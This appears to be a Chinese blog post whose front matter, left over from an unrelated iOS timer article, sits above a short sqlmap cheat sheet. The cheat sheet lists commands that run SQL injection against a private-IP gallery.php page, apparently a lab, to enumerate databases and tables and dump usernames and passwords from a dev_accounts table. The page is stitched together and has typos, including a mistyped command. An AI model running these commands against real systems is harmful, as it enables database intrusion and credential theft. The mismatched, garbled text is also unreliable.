```
---
layout:     post
title:      定时器 你真的会使用吗？
subtitle:   iOS定时器详解
date:       2016-12-13
author:     BY
header-img: img/post-bg-ios9-web.jpg
catalog: 	 true
tags:
    - iOS
    - 定时器
---
```

#                                         sqlmanp速查手册

#### 常见步骤

```shell
#获取数据库
sqlmap -u http://192.168.1.15/gallery/gallery.php?id=1 --dbs
#获取当用户名称
sqlmap -u http://192.168.1.15/gallery/gallery.php?id=1 --current-user
#获取当前database name
sqlmap -u http://192.168.1.15/gallery/gallery.php?id=1 --current-db
#列出表名
sqlmap -u http://192.168.1.15/gallery/gallery.php?id=1 -D gallery --tables
#列出字段
qlmap -u http://192.168.1.15/gallery/gallery.php?id=1 -D gallery -T dev_accounts --columns
#获取字段内容
sqlmap -u http://192.168.1.15/gallery/gallery.php?id=1 -D gallery -T dev_accounts -C id,password,username --dump
```

